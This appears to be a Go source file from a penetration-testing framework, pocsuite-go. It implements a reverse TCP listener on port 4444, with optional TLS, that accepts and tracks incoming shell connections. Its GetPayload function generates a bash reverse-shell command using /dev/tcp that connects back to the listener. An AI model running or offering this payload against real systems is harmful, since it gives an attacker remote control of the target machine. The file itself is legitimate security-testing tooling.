package listener

import (
	"crypto/tls"
	"fmt"
	"net"
	"sync"

	"github.com/seaung/pocsuite-go/config"
	"github.com/seaung/pocsuite-go/modules/interfaces"
)

const (
	defaultListenerPort = 4444
)

type ReverseTCPListener struct {
	listenHost string
	listenPort int
	ipv6       bool
	enableTLS  bool
	certFile   string
	listener   net.Listener
	running    bool
	runningMu  sync.RWMutex
	manager    *ListenerManager
	config     *config.Config
}

func NewReverseTCP(config *config.Config) *ReverseTCPListener {
	return &ReverseTCPListener{
		listenHost: "0.0.0.0",
		listenPort: defaultListenerPort,
		ipv6:       false,
		enableTLS:  false,
		running:    false,
		config:     config,
	}
}

func (r *ReverseTCPListener) Name() string {
	return "reverse_tcp"
}

func (r *ReverseTCPListener) Init() error {
	if listenHost, ok := r.config.Get("ReverseTCP", "listen_host"); ok {
		r.listenHost = listenHost
	}
	if listenPort, ok := r.config.Get("ReverseTCP", "listen_port"); ok {
		if port, err := parsePort(listenPort); err == nil {
			r.listenPort = port
		}
	}
	if ipv6, ok := r.config.Get("ReverseTCP", "ipv6"); ok {
		r.ipv6 = ipv6 == "true"
	}
	if enableTLS, ok := r.config.Get("ReverseTCP", "enable_tls"); ok {
		r.enableTLS = enableTLS == "true"
	}

	if r.ipv6 && r.listenHost == "0.0.0.0" {
		r.listenHost = "::"
	}

	return nil
}

func (r *ReverseTCPListener) IsAvailable() bool {
	r.runningMu.RLock()
	defer r.runningMu.RUnlock()
	return r.running
}

func (r *ReverseTCPListener) Start() error {
	r.runningMu.Lock()
	defer r.runningMu.Unlock()

	if r.running {
		return fmt.Errorf("reverse tcp listener is already running")
	}

	var err error
	listenAddr := fmt.Sprintf("%s:%d", r.listenHost, r.listenPort)
	r.listener, err = net.Listen("tcp", listenAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %w", listenAddr, err)
	}

	if r.enableTLS {
		if r.certFile == "" {
			r.listener.Close()
			return fmt.Errorf("certfile is required for TLS")
		}

		cert, err := tls.LoadX509KeyPair(r.certFile, r.certFile)
		if err != nil {
			r.listener.Close()
			return fmt.Errorf("failed to load certificate: %w", err)
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{cert},
		}

		r.listener = tls.NewListener(r.listener, tlsConfig)
	}

	r.running = true

	go r.acceptConnections()

	scheme := "tcp"
	if r.enableTLS {
		scheme = "tls"
	}
	fmt.Printf("Reverse TCP %s listener started on %s:%d\n", scheme, r.listenHost, r.listenPort)

	return nil
}

func (r *ReverseTCPListener) Stop() error {
	r.runningMu.Lock()
	defer r.runningMu.Unlock()

	if !r.running {
		return fmt.Errorf("reverse tcp listener is not running")
	}

	r.running = false

	if r.listener != nil {
		r.listener.Close()
	}

	return nil
}

func (r *ReverseTCPListener) acceptConnections() {
	for {
		r.runningMu.RLock()
		if !r.running {
			r.runningMu.RUnlock()
			break
		}
		r.runningMu.RUnlock()

		conn, err := r.listener.Accept()
		if err != nil {
			if r.running {
				fmt.Printf("Error accepting connection: %v\n", err)
			}
			continue
		}

		client := &interfaces.Client{
			Conn:    conn,
			Address: conn.RemoteAddr(),
		}

		if r.manager != nil {
			r.manager.AddClient(client)
		}

		if addr, ok := client.Address.(net.Addr); ok {
			fmt.Printf("New connection established from %s\n", addr.String())
		}
	}
}

func (r *ReverseTCPListener) SetListenHost(host string) {
	r.listenHost = host
}

func (r *ReverseTCPListener) SetListenPort(port int) {
	r.listenPort = port
}

func (r *ReverseTCPListener) SetIPv6(ipv6 bool) {
	r.ipv6 = ipv6
	if ipv6 && r.listenHost == "0.0.0.0" {
		r.listenHost = "::"
	}
}

func (r *ReverseTCPListener) SetEnableTLS(enable bool) {
	r.enableTLS = enable
}

func (r *ReverseTCPListener) SetCertFile(certFile string) {
	r.certFile = certFile
}

func (r *ReverseTCPListener) SetManager(manager *ListenerManager) {
	r.manager = manager
}

func (r *ReverseTCPListener) GetListenAddress() string {
	return fmt.Sprintf("%s:%d", r.listenHost, r.listenPort)
}

func (r *ReverseTCPListener) ListClients() []interfaces.Client {
	if r.manager == nil {
		return []interfaces.Client{}
	}
	return r.manager.ListClients()
}

func (r *ReverseTCPListener) GetClient(index int) (*interfaces.Client, error) {
	if r.manager == nil {
		return nil, fmt.Errorf("listener manager not initialized")
	}
	return r.manager.GetClient(index)
}

func (r *ReverseTCPListener) GetPayload() string {
	localIP := getLocalIP()
	if localIP == "" {
		localIP = r.listenHost
	}

	return fmt.Sprintf("bash -i >& /dev/tcp/%s/%d 0>&1", localIP, r.listenPort)
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}

	return ""
}
